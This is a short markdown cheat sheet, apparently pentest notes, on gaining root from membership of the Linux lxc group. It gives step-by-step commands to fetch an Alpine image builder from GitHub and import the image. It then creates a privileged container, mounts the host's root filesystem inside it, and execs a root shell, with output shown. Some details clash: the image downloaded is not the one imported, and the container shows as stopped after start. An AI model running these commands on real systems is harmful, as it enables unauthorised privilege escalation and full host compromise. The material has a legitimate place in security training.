# Linux Containers (LXC)

## 01 - Enumerate

TODO: Fill this info

```
$ ps aux | grep lxc

user@debian:~$ id

user@debian:~$ groups
user lxc
user@debian:~$ grep "lxc" /etc/group
```

## 02 - Exploit

### 2.1 - Clone the repository

```
$ git clone https://github.com/saghul/lxd-alpine-builder
```

### 2.2 - Download the Tarball

```
$ curl -so alpine-v3.13-x86_64-20210218_0139.tar.gz https://github.com/saghul/lxd-alpine-builder/raw/refs/heads/master/alpine-v3.13-x86_64-20210218_0139.tar.gz

$ wget -q https://github.com/saghul/lxd-alpine-builder/raw/refs/heads/master/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

Import the container image.

```
$ lxc image import alpine-v3.10-i686-20190823_0134.tar.gz --alias alpine
Image imported with fingerprint: cb4eb6edd08c165f8f603b951cd20e81cbaa79b73ad20b98bacfe747f96a8b11
```

List the images.

```
$ lxc image list
+--------+--------------+--------+-------------------------------+------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC | DESCRIPTION                   | ARCH | SIZE   | UPLOAD DATE                  |
+--------+--------------+--------+-------------------------------+------+--------+------------------------------+
| alpine | cb4eb6edd08c | no     | alpine v3.10 (20190823_01:34) | i686 | 3.07MB | Aug 23, 2019 at 5:36am (UTC) |
+--------+--------------+--------+-------------------------------+------+--------+------------------------------+
```

```
$ lxc init alpine privesc -c security.privileged=true
Creating privesc
```

```
$ lxc list
+---------+---------+------+------+------------+-----------+
| NAME    | STATE   | IPV4 | IPV6 | TYPE | SNAPSHOTS       |
+---------+---------+------+------+------------+-----------+
| privesc | STOPPED |      |      | PERSISTENT | 0         |
+---------+---------+------+------+------------+-----------+
```

```
$ lxc config device add privesc host-root disk source=/ path=/mnt/root/
Device host-root added to privesc
```

```
$ lxc start privesc
$ lxc list
+---------+---------+------+------+------------+-----------+
| NAME    | STATE   | IPV4 | IPV6 | TYPE | SNAPSHOTS       |
+---------+---------+------+------+------------+-----------+
| privesc | STOPPED |      |      | PERSISTENT | 0         |
+---------+---------+------+------+------------+-----------+
```

Execute the Linux container.

```
$ lxc exec privesc /bin/sh
~ # id
uid=0(root) gid=0(root)
```